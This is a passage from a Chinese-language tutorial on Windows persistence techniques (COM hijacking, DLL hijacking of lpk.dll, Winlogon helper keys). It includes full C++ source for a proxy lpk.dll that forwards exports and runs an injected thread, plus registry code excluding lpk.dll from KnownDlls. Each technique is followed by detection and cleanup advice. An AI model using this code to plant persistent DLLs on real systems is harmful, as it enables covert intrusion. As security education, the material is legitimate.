           return;
       }
       if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
       {
           ShowError("RegDeleteValueA");
           return;
       }
       remove(szSaveName.c_str());
       remove(defaultPath.c_str());
       ::MessageBoxA(NULL, "Delete comHijacking OK!", "OK", MB_OK);
       m_Com = FALSE;
    }
    UpdateData(FALSE);
    }
###  运行效果图
运行后，文件和注册表如下：
运行计算器，弹出对话框：
###  检查及清除方法
由于COM对象是操作系统和已安装软件的合法部分，因此直接阻止对COM对象的更改可能会对正常的功能产生副作用。相比之下，使用白名单识别潜在的病毒会更有效。
现有COM对象的注册表项可能很少发生更改。当具有已知路径和二进制的条目被替换或更改为异常值以指向新位置中的未知二进制时，它可能是可疑的行为，应该进行调查。同样，如果收集和分析程序DLL加载，任何与COM对象注册表修改相关的异常DLL加载都可能表明已执行COM劫持。
## DLL劫持
###  代码及原理介绍
众所周知，Windows有资源共享机制，当对象想要访问此共享功能时，它会将适当的DLL加载到其内存空间中。但是，这些可执行文件并不总是知道DLL在文件系统中的确切位置。为了解决这个问题，Windows实现了不同目录的搜索顺序，其中可以找到这些DLL。
系统使用DLL搜索顺序取决于是否启用安全DLL搜索模式。
WindowsXP默认情况下禁用安全DLL搜索模式。之后默认启用安全DLL搜索模式
若要使用此功能，需创建HKEY_LOCAL_MACHINESystemCurrentControlSetControlSession
ManagerSafeDllSearchMode注册表值，0为禁止，1为启用。
SafeDLLSearchMode启用后，搜索顺序如下：
从其中加载应用程序的目录、系统目录。
使用GetSystemDirectory函数获取此目录的路径。
16位系统目录。
没有获取此目录的路径的函数，但会搜索它。
Windows目录。
使用GetWindowsDirectory函数获取此目录。
当前目录。
PATH环境变量中列出的目录。
SafeDLLSearchMode禁用后，搜索顺序如下：
从其中加载应用程序的目录
当前目录
系统目录。
使用GetSystemDirectory函数获取此目录的路径。
16位系统目录。
没有获取此目录的路径的函数，但会搜索它。
Windows目录。
使用GetWindowsDirectory函数获取此目录。
PATH环境变量中列出的目录。
DLL劫持利用搜索顺序来加载恶意DLL以代替合法DLL。如果应用程序使用Windows的DLL搜索来查找DLL，且攻击者可以将同名DLL的顺序置于比合法DLL更高的位置，则应用程序将加载恶意DLL。
可以用来劫持系统程序，也可以劫持用户程序。劫持系统程序具有兼容性，劫持用户程序则有针对性。结合本文的主题，这里选择劫持系统程序。
可以劫持的dll有：
lpk.dll、usp10.dll、msimg32.dll、midimap.dll、ksuser.dll、comres.dll、ddraw.dll
以lpk.dll为列，explorer桌面程序的启动需要加载lpk.dll，当进入桌面后lpk.dll便被加载了，劫持lpk.dll之后，每次启动系统，自己的lpk.dll都会被加载，实现了持久化攻击的效果。
下面就是要构建一个lpk.dll：
将系统下的lpk.dll导入IDA，查看导出表的函数
构造一个和lpk.dll一样的导出表
加载系统目录下的lpk.DLL；
将导出函数转发到系统目录下的LPK.DLL上
在初始化函数中加入我们要执行的代码。
具体dll代码如下：
    #include "pch.h"
    #include 
    #include 
    // 导出函数
    #pragma comment(linker, "/EXPORT:LpkInitialize=_AheadLib_LpkInitialize,@1")
    #pragma comment(linker, "/EXPORT:LpkTabbedTextOut=_AheadLib_LpkTabbedTextOut,@2")
    #pragma comment(linker, "/EXPORT:LpkDllInitialize=_AheadLib_LpkDllInitialize,@3")
    #pragma comment(linker, "/EXPORT:LpkDrawTextEx=_AheadLib_LpkDrawTextEx,@4")
    #pragma comment(linker, "/EXPORT:LpkExtTextOut=_AheadLib_LpkExtTextOut,@6")
    #pragma comment(linker, "/EXPORT:LpkGetCharacterPlacement=_AheadLib_LpkGetCharacterPlacement,@7")
    #pragma comment(linker, "/EXPORT:LpkGetTextExtentExPoint=_AheadLib_LpkGetTextExtentExPoint,@8")
    #pragma comment(linker, "/EXPORT:LpkPSMTextOut=_AheadLib_LpkPSMTextOut,@9")
    #pragma comment(linker, "/EXPORT:LpkUseGDIWidthCache=_AheadLib_LpkUseGDIWidthCache,@10")
    #pragma comment(linker, "/EXPORT:ftsWordBreak=_AheadLib_ftsWordBreak,@11")
    // 宏定义
    #define EXTERNC extern "C"
    #define NAKED __declspec(naked)
    #define EXPORT __declspec(dllexport)
    #define ALCPP EXPORT NAKED
    #define ALSTD EXTERNC EXPORT NAKED void __stdcall
    #define ALCFAST EXTERNC EXPORT NAKED void __fastcall
    #define ALCDECL EXTERNC NAKED void __cdecl
    //LpkEditControl导出的是数组，不是单一的函数（by Backer）
    EXTERNC void __cdecl AheadLib_LpkEditControl(void);
    EXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = { AheadLib_LpkEditControl };
    //添加全局变量
    BOOL g_bInited = FALSE;
    // AheadLib 命名空间
    namespace AheadLib
    {
    HMODULE m_hModule = NULL; // 原始模块句柄
    // 加载原始模块
    BOOL WINAPI Load()
    {
    TCHAR tzPath[MAX_PATH];
    TCHAR tzTemp[MAX_PATH * 2];
    GetSystemDirectory(tzPath, MAX_PATH);
    lstrcat(tzPath, TEXT("\lpk.dll"));
    OutputDebugString(tzPath);
    m_hModule = LoadLibrary(tzPath);
    if (m_hModule == NULL)
    {
    wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath);
    MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);
    };
    return (m_hModule != NULL);
    }
    // 释放原始模块
    VOID WINAPI Free()
    {
    if (m_hModule)
    {
    FreeLibrary(m_hModule);
    }
    }
    // 获取原始函数地址
    FARPROC WINAPI GetAddress(PCSTR pszProcName)
    {
    FARPROC fpAddress;
    CHAR szProcName[16];
    TCHAR tzTemp[MAX_PATH];
    fpAddress = GetProcAddress(m_hModule, pszProcName);
    if (fpAddress == NULL)
    {
    if (HIWORD(pszProcName) == 0)
    {
    wsprintfA(szProcName, "%p", pszProcName);
    pszProcName = szProcName;
    }
    wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运``行。"), pszProcName);
    MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);
    ExitProcess(-2);
    }
    return fpAddress;
    }
    }
    using namespace AheadLib;
    //函数声明
    void WINAPIV Init(LPVOID pParam);
    void WINAPIV Init(LPVOID pParam)
    {
    MessageBoxA(0, "Hello Topsec", "Hello Topsec", 0);
    return;
    }
    // 入口函数
    BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
    {
    if (dwReason == DLL_PROCESS_ATTACH)
    {
    DisableThreadLibraryCalls(hModule);
    if (g_bInited == FALSE) {
    Load();
    g_bInited = TRUE;
    }
    //LpkEditControl这个数组有14个成员，必须将其复制过来
    memcpy((LPVOID)(LpkEditControl + 1), (LPVOID)((int*)GetAddress("LpkEditControl") + 1), 52);
    _beginthread(Init, NULL, NULL);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
    Free();
    }
    return TRUE;
    }
    // 导出函数
    ALCDECL AheadLib_LpkInitialize(void)
    {
    if (g_bInited == FALSE) {
    Load();
    g_bInited = TRUE;
    }
    GetAddress("LpkInitialize");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkTabbedTextOut(void)
    {
    GetAddress("LpkTabbedTextOut");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkDllInitialize(void)
    {
    GetAddress("LpkDllInitialize");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkDrawTextEx(void)
    {
    GetAddress("LpkDrawTextEx");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkEditControl(void)
    {
    GetAddress("LpkEditControl");
    __asm jmp DWORD ptr[EAX];
    }
    // 导出函数
    ALCDECL AheadLib_LpkExtTextOut(void)
    {
    GetAddress("LpkExtTextOut");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkGetCharacterPlacement(void)
    {
    GetAddress("LpkGetCharacterPlacement");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkGetTextExtentExPoint(void)
    {
    GetAddress("LpkGetTextExtentExPoint");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkPSMTextOut(void)
    {
    GetAddress("LpkPSMTextOut");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_LpkUseGDIWidthCache(void)
    {
    GetAddress("LpkUseGDIWidthCache");
    __asm JMP EAX;
    }
    // 导出函数
    ALCDECL AheadLib_ftsWordBreak(void)
    {
    GetAddress("ftsWordBreak");
    __asm JMP EAX;
    }
    最后修改注册表键值HKEY_LOCAL_MACHINESystemCurrentControlSetControlSessionManager ExcludeFromKnownDlls，把lpk.dll加进去。
    HKEY hKey;
    DWORD dwDisposition;
    const char path[] = “lpk.dll”;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,” System CurrentControlSet Control SessionManager “, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition));
    RegSetValueExA(hKey, NULL, 0, REG_MULTI_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
###  运行效果图
将生成的lpk.dll放到c:/Windows目录
重启系统，自动弹出对话框
查找explorer，加载的正是我们的lpk.dll
注册表修改如下
###  检查及清除方法
启用安全DLL搜索模式，与此相关的Windows注册表键位于HKLMSYSTEMCurrentControlSetControlSession
ManagerSafeDLLSearchMode
监视加载到进程中的DLL，并检测具有相同文件名但路径异常的DLL。
## winlogon helper
###  原理及代码介绍
Winlogon.exe进程是Windows操作系统中非常重要的一部分，Winlogon用于执行与Windows登录过程相关的各种关键任务，例如，当在用户登录时，Winlogon进程负责将用户配置文件加载到注册表中。
Winlogon进程会HOOK系统函数监控键盘是否按下Ctrl + Alt + Delete，这被称为“Secure Attention
Sequence”，这就是为什么一些系统会配置为要求您在登录前按Ctrl + Alt +
Delete。这种键盘快捷键的组合被Winlogon.exe捕获，确保您安全登录桌面，其他程序无法监控您正在键入的密码或模拟登录对话框。Windows登录应用程序还会捕获用户的键盘和鼠标活动，在一段时间未发现键盘和鼠标活动时启动屏幕保护程序。
总之，Winlogon是登录过程的关键部分，需要持续在后台运行。如果您有兴趣，Microsoft还提供Winlogon进程的更详细的技术说明，在此不再赘述。
在注册表项HKLMSoftwareMicrosoftWindowsNTCurrentVersionWinlogon和HKCUSoftwareMicrosoftWindows
NTCurrentVersionWinlogon用于管理支持Winlogon的帮助程序和扩展功能，对这些注册表项的恶意修改可能导致Winlogon加载和执行恶意DLL或可执行文件。已知以下子项可能容易被恶意代码所利用：
WinlogonNotify – 指向处理Winlogon事件的通知包DLL